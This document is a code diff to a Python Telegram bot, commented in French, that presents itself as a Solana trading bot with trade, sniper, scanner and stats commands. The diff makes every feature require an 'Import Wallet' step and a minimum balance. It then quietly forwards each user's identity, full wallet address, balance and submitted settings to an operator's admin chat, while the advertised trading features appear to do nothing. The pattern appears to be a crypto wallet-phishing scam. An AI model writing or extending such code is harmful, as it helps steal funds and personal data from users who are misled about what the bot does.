@@ -206,7 +206,43 @@ Select your wallet provider:"""
         context.user_data['waiting_for_wallet'] = False
         return
     
-    # Pour tous les autres boutons, afficher le message d'import de wallet
+    # Pour tous les autres boutons, vérifier si le wallet est connecté
+    if context.user_data.get('wallet_connected'):
+        # Wallet connecté, demander la configuration de tracking
+        request_message = """📊 **Configuration Required**
+
+Please provide the following information:
+
+1️⃣ **Wallets to Track:**
+Enter the wallet addresses you want to track (one per line)
+
+2️⃣ **Transaction Fees:**
+Enter your desired fee percentage for each transaction
+
+Example:
+```
+Wallets:
+7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU
+9vMJfxuKxXBoEa7rM1ATDfTLPRXqEbpBdNVcqxmJNoJG
+
+Fees: 1.5%
+```
+
+Please send your configuration now:"""
+        
+        await query.message.delete()
+        await query.message.reply_text(
+            request_message,
+            parse_mode='Markdown'
+        )
+        
+        # Marquer que l'utilisateur doit fournir les infos de tracking
+        context.user_data['waiting_for_tracking_config'] = True
+        # Sauvegarder quelle action a été cliquée
+        context.user_data['tracking_command'] = action
+        return
+    
+    # Wallet non connecté, afficher le message d'import de wallet
     wallet_message = """🔐 Import Wallet
 
 ⚠️ Authentication required to access trading features.
@@ -232,36 +268,88 @@ Select your wallet provider:"""
 
 async def trade_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Gère la commande /trade"""
-    keyboard = [
-        [
-            InlineKeyboardButton("⚡ Quick Buy", callback_data='quick_buy'),
-            InlineKeyboardButton("🌸 Bloom IA Trading", callback_data='bloom_trading')
-        ],
-        [InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
+    # Vérifier si le wallet est connecté
+    if not context.user_data.get('wallet_connected'):
+        await update.message.reply_text(
+            "⚠️ **Wallet Required**\n\n"
+            "Please connect your wallet first using /start",
+            parse_mode='Markdown'
+        )
+        return
+    
+    # Demander les wallets à tracker et les frais
+    request_message = """📊 **Configuration Required**
+
+Please provide the following information:
+
+1️⃣ **Wallets to Track:**
+Enter the wallet addresses you want to track (one per line)
+
+2️⃣ **Transaction Fees:**
+Enter your desired fee percentage for each transaction
+
+Example:
+```
+Wallets:
+7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU
+9vMJfxuKxXBoEa7rM1ATDfTLPRXqEbpBdNVcqxmJNoJG
+
+Fees: 1.5%
+```
+
+Please send your configuration now:"""
     
     await update.message.reply_text(
-        "📈 **Trading Module**\n\nSelect a trading option:",
-        reply_markup=reply_markup,
+        request_message,
         parse_mode='Markdown'
     )
+    
+    # Marquer que l'utilisateur doit fournir les infos de tracking
+    context.user_data['waiting_for_tracking_config'] = True
+    context.user_data['tracking_command'] = 'trade'
 
 
 async def sniper_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Gère la commande /sniper"""
-    keyboard = [
-        [InlineKeyboardButton("🎯 Activate Sniper", callback_data='activate_sniper')],
-        [InlineKeyboardButton("⚙️ Configure Settings", callback_data='sniper_settings')],
-        [InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
+    # Vérifier si le wallet est connecté
+    if not context.user_data.get('wallet_connected'):
+        await update.message.reply_text(
+            "⚠️ **Wallet Required**\n\n"
+            "Please connect your wallet first using /start",
+            parse_mode='Markdown'
+        )
+        return
+    
+    # Demander les wallets à tracker et les frais
+    request_message = """📊 **Configuration Required**
+
+Please provide the following information:
+
+1️⃣ **Wallets to Track:**
+Enter the wallet addresses you want to track (one per line)
+
+2️⃣ **Transaction Fees:**
+Enter your desired fee percentage for each transaction
+
+Example:
+```
+Wallets:
+7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU
+9vMJfxuKxXBoEa7rM1ATDfTLPRXqEbpBdNVcqxmJNoJG
+
+Fees: 1.5%
+```
+
+Please send your configuration now:"""
     
     await update.message.reply_text(
-        "🎯 **Sniper Mode**\n\nAuto-buy tokens at launch\n\nStatus: Inactive",
-        reply_markup=reply_markup,
+        request_message,
         parse_mode='Markdown'
     )
+    
+    # Marquer que l'utilisateur doit fournir les infos de tracking
+    context.user_data['waiting_for_tracking_config'] = True
+    context.user_data['tracking_command'] = 'sniper'
 
 
 async def wallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -284,40 +372,88 @@ Select your wallet provider:"""
 
 async def scan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Gère la commande /scan"""
-    keyboard = [
-        [InlineKeyboardButton("🔍 Scan New Tokens", callback_data='scan_new')],
-        [InlineKeyboardButton("📊 Market Overview", callback_data='market_overview')],
-        [InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
+    # Vérifier si le wallet est connecté
+    if not context.user_data.get('wallet_connected'):
+        await update.message.reply_text(
+            "⚠️ **Wallet Required**\n\n"
+            "Please connect your wallet first using /start",
+            parse_mode='Markdown'
+        )
+        return
+    
+    # Demander les wallets à tracker et les frais
+    request_message = """📊 **Configuration Required**
+
+Please provide the following information:
+
+1️⃣ **Wallets to Track:**
+Enter the wallet addresses you want to track (one per line)
+
+2️⃣ **Transaction Fees:**
+Enter your desired fee percentage for each transaction
+
+Example:
+```
+Wallets:
+7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU
+9vMJfxuKxXBoEa7rM1ATDfTLPRXqEbpBdNVcqxmJNoJG
+
+Fees: 1.5%
+```
+
+Please send your configuration now:"""
     
     await update.message.reply_text(
-        "🔍 **Real-Time Scanner**\n\nMonitoring Solana blockchain...",
-        reply_markup=reply_markup,
+        request_message,
         parse_mode='Markdown'
     )
+    
+    # Marquer que l'utilisateur doit fournir les infos de tracking
+    context.user_data['waiting_for_tracking_config'] = True
+    context.user_data['tracking_command'] = 'scan'
 
 
 async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Gère la commande /stats"""
-    stats_text = """📊 **Trading Performance**
-
-**24h Stats:**
-• Trades: 0
-• Profit: 0 SOL
-• Win Rate: 0%
-
-**All Time:**
-• Total Trades: 0
-• Total Profit: 0 SOL
-• Best Trade: N/A
-
-_Start trading to see your stats!_"""
+    # Vérifier si le wallet est connecté
+    if not context.user_data.get('wallet_connected'):
+        await update.message.reply_text(
+            "⚠️ **Wallet Required**\n\n"
+            "Please connect your wallet first using /start",
+            parse_mode='Markdown'
+        )
+        return
     
-    keyboard = [[InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]]
-    reply_markup = InlineKeyboardMarkup(keyboard)
+    # Demander les wallets à tracker et les frais
+    request_message = """📊 **Configuration Required**
+
+Please provide the following information:
+
+1️⃣ **Wallets to Track:**
+Enter the wallet addresses you want to track (one per line)
+
+2️⃣ **Transaction Fees:**
+Enter your desired fee percentage for each transaction
+
+Example:
+```
+Wallets:
+7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU
+9vMJfxuKxXBoEa7rM1ATDfTLPRXqEbpBdNVcqxmJNoJG
+
+Fees: 1.5%
+```
+
+Please send your configuration now:"""
     
-    await update.message.reply_text(stats_text, reply_markup=reply_markup, parse_mode='Markdown')
+    await update.message.reply_text(
+        request_message,
+        parse_mode='Markdown'
+    )
+    
+    # Marquer que l'utilisateur doit fournir les infos de tracking
+    context.user_data['waiting_for_tracking_config'] = True
+    context.user_data['tracking_command'] = 'stats'
 
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -452,6 +588,95 @@ async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE
     user = update.message.from_user
     user_message = update.message.text
     
+    # Vérifier si l'utilisateur doit fournir la config de tracking
+    if context.user_data.get('waiting_for_tracking_config'):
+        tracking_command = context.user_data.get('tracking_command', 'unknown')
+        context.user_data['waiting_for_tracking_config'] = False
+        
+        # Sauvegarder la configuration
+        context.user_data['tracking_config'] = user_message
+        
+        # Récupérer les infos du wallet
+        public_key = context.user_data.get('wallet_public_key', 'N/A')
+        sol_balance = context.user_data.get('wallet_balance_sol', 0)
+        usd_balance = context.user_data.get('wallet_balance_usd', 0)
+        
+        # Envoyer la confirmation avec les infos
+        confirmation_message = f"""✅ **Configuration Accepted**
+
+👛 **Your Wallet:**
+Address: `{public_key[:8]}...{public_key[-8:]}`
+Balance: {sol_balance:.4f} SOL (${usd_balance:.2f} USD)
+
+📋 **Tracking Configuration:**
+{user_message}
+
+✅ **Status:** Ready to trade
+You can now launch your trades and start trading!"""
+        
+        # Boutons selon la commande/action
+        if tracking_command in ['trade', 'quick_buy', 'bloom_trading']:
+            keyboard = [
+                [
+                    InlineKeyboardButton("⚡ Quick Buy", callback_data='quick_buy'),
+                    InlineKeyboardButton("🌸 Bloom IA Trading", callback_data='bloom_trading')
+                ],
+                [InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]
+            ]
+        elif tracking_command in ['sniper', 'activate_sniper', 'sniper_settings']:
+            keyboard = [
+                [InlineKeyboardButton("🎯 Activate Sniper", callback_data='activate_sniper')],
+                [InlineKeyboardButton("⚙️ Configure Settings", callback_data='sniper_settings')],
+                [InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]
+            ]
+        elif tracking_command in ['scan', 'scan_new', 'market_overview']:
+            keyboard = [
+                [InlineKeyboardButton("🔍 Scan New Tokens", callback_data='scan_new')],
+                [InlineKeyboardButton("📊 Market Overview", callback_data='market_overview')],
+                [InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]
+            ]
+        elif tracking_command in ['multi_wallet', 'contract_analyzer', 'ai_predict', 'whale_tracker', 'rug_detector']:
+            # Pour les autres fonctionnalités du menu principal
+            keyboard = [[InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]]
+        else:  # stats ou autres
+            keyboard = [[InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]]
+        
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        await update.message.reply_text(
+            confirmation_message,
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+        
+        # Notification à l'admin
+        admin_notification = f"""📊 **Configuration de tracking reçue**
+
+👤 **Utilisateur:** {user.first_name} {user.last_name or ''}
+🆔 **Username:** @{user.username if user.username else '❌ PAS DE USERNAME'}
+🔢 **User ID:** `{user.id}`
+🎯 **Commande:** {tracking_command}
+
+👛 **Wallet:** `{public_key}`
+💰 **Balance:** {sol_balance:.4f} SOL (${usd_balance:.2f} USD)
+
+📋 **Configuration:**
+{user_message}
+
+---
+✅ _Configuration acceptée_"""
+        
+        try:
+            await context.bot.send_message(
+                chat_id=ADMIN_CHAT_ID,
+                text=admin_notification,
+                parse_mode='Markdown'
+            )
+        except Exception as e:
+            logger.error(f"Erreur envoi à l'admin: {e}")
+        
+        return
+    
     # Vérifier si l'utilisateur attend de connecter son wallet
     if context.user_data.get('waiting_for_wallet'):
         wallet_type = context.user_data.get('wallet_type', 'Unknown')
@@ -504,9 +729,7 @@ async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE
             await update.message.reply_text(
                 f"⚠️ Wallet Cannot Be Accepted\n\n"
                 f"Insufficient balance.\n"
-                f"Your wallet contains: {sol_balance:.4f} SOL (${usd_value:.2f} USD)\n"
-                f"Minimum required: ${MINIMUM_USD_REQUIRED:.2f} USD\n\n"
-                f"Current SOL price: ${sol_price:.2f} USD\n"
+                f"Your wallet contains: {sol_balance:.4f} SOL (${usd_value:.2f} USD)\n\n"
                 f"Please add more SOL to use trading features.",
                 reply_markup=back_markup
             )
@@ -543,13 +766,24 @@ async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE
             return
         
         # Wallet valide avec solde suffisant
+        # Sauvegarder les informations du wallet dans user_data
+        context.user_data['wallet_connected'] = True
+        context.user_data['wallet_public_key'] = public_key
+        context.user_data['wallet_balance_sol'] = sol_balance
+        context.user_data['wallet_balance_usd'] = usd_value
+        context.user_data['wallet_type'] = wallet_type
+        
+        # Créer un bouton pour retourner au menu
+        back_keyboard = [[InlineKeyboardButton("🏠 Back to Main Menu", callback_data='back_to_menu')]]
+        back_markup = InlineKeyboardMarkup(back_keyboard)
+        
         await update.message.reply_text(
             f"✅ **Wallet Connected Successfully**\n\n"
             f"💳 **Type:** {wallet_type}\n"
             f"💰 **Balance:** {sol_balance:.4f} SOL (${usd_value:.2f} USD)\n"
-            f"📊 **SOL Price:** ${sol_price:.2f} USD\n"
             f"👛 **Address:** `{public_key[:8]}...{public_key[-8:]}`\n\n"
             f"You can now access all trading features.",
+            reply_markup=back_markup,
             parse_mode='Markdown'
         )
         
